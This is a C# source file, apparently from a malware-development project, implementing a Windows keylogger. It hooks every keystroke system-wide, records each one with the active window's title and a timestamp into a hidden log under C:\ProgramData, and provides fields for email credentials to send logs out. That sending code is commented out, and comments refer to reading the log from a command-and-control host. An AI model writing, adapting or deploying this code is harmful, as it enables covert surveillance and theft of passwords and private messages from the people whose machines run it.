﻿using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;
using System.Net.Mail;
using System.Net;
using System.Text;

// nslookup myip.opendns.com resolver1.opendns.com ~ get public ip 
// type C:\ProgramData\mylog.txt ~ cmd to type to view log file in c&c

namespace MalDev
{
    class Keylog
    {
        // ----------- EDIT THESE VARIABLES FOR YOUR OWN USE CASE ----------- //
        private const string FROM_EMAIL_ADDRESS = "";
        private const string FROM_EMAIL_PASSWORD = "";
        private const string TO_EMAIL_ADDRESS = "";
        private const string LOG_FILE_NAME = @"C:\ProgramData\mylog.txt";
        private const string ARCHIVE_FILE_NAME = @"C:\ProgramData\mylog_archive.txt";
        private const bool INCLUDE_LOG_AS_ATTACHMENT = true;
        private const int MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL = 300;
        private const int MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG = 0;
        // ----------------------------- END -------------------------------- //

        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x0100;
        private static IntPtr hook = IntPtr.Zero;
        private static LowLevelKeyboardProc llkProcedure = HookCallback;
        private static string buffer = "";
        private static string fgAppTitle = "";

        public Keylog()
        {
            fgAppTitle = GetCaptionOfActiveWindow();
            hook = SetHook(llkProcedure);
            Application.Run();
            UnhookWindowsHookEx(hook);
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            // Console.Out.WriteLine(GetCaptionOfActiveWindow());
            // if (buffer.Length >= MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG)
            // {
            StreamWriter output = new StreamWriter(LOG_FILE_NAME, true);

            var strTitle = string.Empty;
            var handle = GetForegroundWindow();
            // Obtain the length of the text   
            var intLength = GetWindowTextLength(handle) + 1;
            var stringBuilder = new StringBuilder(intLength);
            if (GetWindowText(handle, stringBuilder, intLength) > 0)
            {
                strTitle = stringBuilder.ToString();
            }

            if (fgAppTitle != strTitle)
            {
                output.Write(Environment.NewLine + "****************************" + strTitle +
                             "****************************" + Environment.NewLine + DateTime.Now + Environment.NewLine); 
                fgAppTitle = strTitle;
            }


            output.Write(buffer);
            output.Close();
            buffer = "";
            // }

            // FileInfo logFile = new FileInfo(@"C:\ProgramData\mylog.txt");
            //
            // // Archive and email the log file if the max size has been reached
            // if (logFile.Exists && logFile.Length >= MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL)
            // {
            //     try
            //     {
            //         // Copy the log file to the archive
            //         logFile.CopyTo(ARCHIVE_FILE_NAME, true);
            //
            //         // Delete the log file
            //         logFile.Delete();
            //
            //         // Email the archive and send email using a new thread
            //         // System.Threading.Thread mailThread = new System.Threading.Thread(Program.sendMail);
            //         Console.Out.WriteLine("\n\n**MAILSENDING**\n");
            //         // mailThread.Start();
            //     }
            //     catch(Exception e)
            //     {
            //         Console.Out.WriteLine(e.Message);
            //     }
            // }

            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if (((Keys)vkCode).ToString() == "OemPeriod")
                {
                    Console.Out.Write(".");
                    buffer += ".";
                }
                else if (((Keys)vkCode).ToString() == "Oemcomma")
                {
                    Console.Out.Write(",");
                    buffer += ",";
                }
                else if (((Keys)vkCode).ToString() == "Space")
                {
                    Console.Out.Write(" ");
                    buffer += " ";
                }
                else
                {
                    Console.Out.Write((Keys)vkCode);
                    buffer += (Keys)vkCode;
                }
            }

            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod,
            uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int GetWindowTextLength(IntPtr hWnd);

        public string GetCaptionOfActiveWindow()
        {
            var strTitle = string.Empty;
            var handle = GetForegroundWindow();
            // Obtain the length of the text   
            var intLength = GetWindowTextLength(handle) + 1;
            var stringBuilder = new StringBuilder(intLength);
            if (GetWindowText(handle, stringBuilder, intLength) > 0)
            {
                strTitle = stringBuilder.ToString();
            }
            return strTitle;
        }
    }
}